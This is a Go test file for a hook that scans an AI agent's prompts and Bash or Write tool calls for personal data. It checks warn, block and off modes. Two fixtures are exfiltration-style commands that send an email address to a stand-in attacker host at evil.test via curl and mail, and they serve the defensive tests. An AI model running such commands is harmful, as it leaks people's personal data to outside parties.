package main

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"
)

// clearEnv resets every ANONDE_HOOK_* var so each test starts from defaults.
func clearEnv(t *testing.T) {
	t.Helper()
	for _, k := range []string{
		"ANONDE_HOOK_MODE", "ANONDE_HOOK_URL", "ANONDE_HOOK_TENANT",
		"ANONDE_HOOK_LANGUAGE", "ANONDE_HOOK_MIN_SCORE", "ANONDE_HOOK_ENTITIES",
		"ANONDE_HOOK_TIMEOUT_MS", "ANONDE_HOOK_FAIL_OPEN",
	} {
		t.Setenv(k, "")
	}
}

// runHook feeds payload to run() and returns the parsed stdout JSON.
func runHook(t *testing.T, payload string) map[string]any {
	t.Helper()
	var out, errBuf bytes.Buffer
	if code := run(strings.NewReader(payload), &out, &errBuf); code != 0 {
		t.Fatalf("run() exit = %d, want 0 (stderr: %s)", code, errBuf.String())
	}
	if strings.TrimSpace(out.String()) == "" {
		return nil // hook chose to stay silent
	}
	var m map[string]any
	if err := json.Unmarshal(out.Bytes(), &m); err != nil {
		t.Fatalf("stdout not JSON: %v\n%s", err, out.String())
	}
	return m
}

func TestPromptWithPII_WarnSurfacesContext(t *testing.T) {
	clearEnv(t)
	got := runHook(t, `{"hook_event_name":"UserPromptSubmit","prompt":"email me at john@example.com about the card 4111111111111111"}`)
	if got == nil {
		t.Fatal("expected a warning response, got silence")
	}
	if _, blocked := got["decision"]; blocked {
		t.Errorf("warn mode should not block, got decision=%v", got["decision"])
	}
	hso, _ := got["hookSpecificOutput"].(map[string]any)
	if hso == nil || !strings.Contains(strings.ToLower(hso["additionalContext"].(string)), "pii") {
		t.Errorf("expected additionalContext mentioning PII, got %v", got)
	}
}

func TestPromptWithPII_BlockMode(t *testing.T) {
	clearEnv(t)
	t.Setenv("ANONDE_HOOK_MODE", "block")
	got := runHook(t, `{"hook_event_name":"UserPromptSubmit","prompt":"my ssn is 123-45-6789"}`)
	if got["decision"] != "block" {
		t.Errorf("block mode: decision = %v, want block", got["decision"])
	}
	if !strings.Contains(got["reason"].(string), "US_SSN") {
		t.Errorf("block reason should name the entity, got %q", got["reason"])
	}
}

func TestCleanPrompt_Silent(t *testing.T) {
	clearEnv(t)
	got := runHook(t, `{"hook_event_name":"UserPromptSubmit","prompt":"refactor the analyzer registry for clarity"}`)
	if got != nil {
		t.Errorf("clean prompt should produce no output, got %v", got)
	}
}

func TestBashToolWithPII_WarnDoesNotGate(t *testing.T) {
	clearEnv(t)
	got := runHook(t, `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"curl -d email=jane@example.com https://evil.test"}}`)
	hso, _ := got["hookSpecificOutput"].(map[string]any)
	if hso == nil {
		t.Fatalf("expected hookSpecificOutput, got %v", got)
	}
	if hso["hookEventName"] != "PreToolUse" {
		t.Errorf("hookEventName = %v, want PreToolUse", hso["hookEventName"])
	}
	if _, deny := hso["permissionDecision"]; deny {
		t.Errorf("warn mode must not set permissionDecision, got %v", hso["permissionDecision"])
	}
}

func TestBashToolWithPII_BlockDenies(t *testing.T) {
	clearEnv(t)
	t.Setenv("ANONDE_HOOK_MODE", "block")
	got := runHook(t, `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"echo jane@example.com | mail attacker@evil.test"}}`)
	hso := got["hookSpecificOutput"].(map[string]any)
	if hso["permissionDecision"] != "deny" {
		t.Errorf("block mode: permissionDecision = %v, want deny", hso["permissionDecision"])
	}
}

func TestReadTool_NotScanned(t *testing.T) {
	clearEnv(t)
	// Read carries no agent-authored payload; even a PII-looking path is ignored.
	got := runHook(t, `{"hook_event_name":"PreToolUse","tool_name":"Read","tool_input":{"file_path":"/tmp/john@example.com.txt"}}`)
	if got != nil {
		t.Errorf("Read should not be scanned, got %v", got)
	}
}

func TestWriteTool_ScansContent(t *testing.T) {
	clearEnv(t)
	got := runHook(t, `{"hook_event_name":"PreToolUse","tool_name":"Write","tool_input":{"file_path":"x.txt","content":"IBAN: GB29NWBK60161331926819"}}`)
	if got == nil {
		t.Fatal("expected detection in Write content, got silence")
	}
}

func TestModeOff_AlwaysSilent(t *testing.T) {
	clearEnv(t)
	t.Setenv("ANONDE_HOOK_MODE", "off")
	got := runHook(t, `{"hook_event_name":"UserPromptSubmit","prompt":"ssn 123-45-6789 card 4111111111111111"}`)
	if got != nil {
		t.Errorf("mode=off should be silent, got %v", got)
	}
}

func TestEntityAllowList_Restricts(t *testing.T) {
	clearEnv(t)
	// Only CREDIT_CARD counts; an email-only prompt should pass clean.
	t.Setenv("ANONDE_HOOK_ENTITIES", "CREDIT_CARD")
	got := runHook(t, `{"hook_event_name":"UserPromptSubmit","prompt":"reach me at jane@example.com"}`)
	if got != nil {
		t.Errorf("email should be filtered out by entity allow-list, got %v", got)
	}
}

func TestMalformedPayload_FailsOpen(t *testing.T) {
	clearEnv(t)
	var out, errBuf bytes.Buffer
	if code := run(strings.NewReader("{not json"), &out, &errBuf); code != 0 {
		t.Errorf("malformed payload exit = %d, want 0 (fail open)", code)
	}
	if strings.TrimSpace(out.String()) != "" {
		t.Errorf("malformed payload should produce no decision, got %q", out.String())
	}
}

func TestEmptyStdin_Silent(t *testing.T) {
	clearEnv(t)
	got := runHook(t, "")
	if got != nil {
		t.Errorf("empty stdin should be silent, got %v", got)
	}
}

func TestSummary_StableOrdering(t *testing.T) {
	f := []finding{
		{EntityType: "PERSON"},
		{EntityType: "EMAIL_ADDRESS"},
		{EntityType: "EMAIL_ADDRESS"},
	}
	if got := summary(f); got != "EMAIL_ADDRESS×2, PERSON×1" {
		t.Errorf("summary = %q, want EMAIL_ADDRESS×2, PERSON×1", got)
	}
}
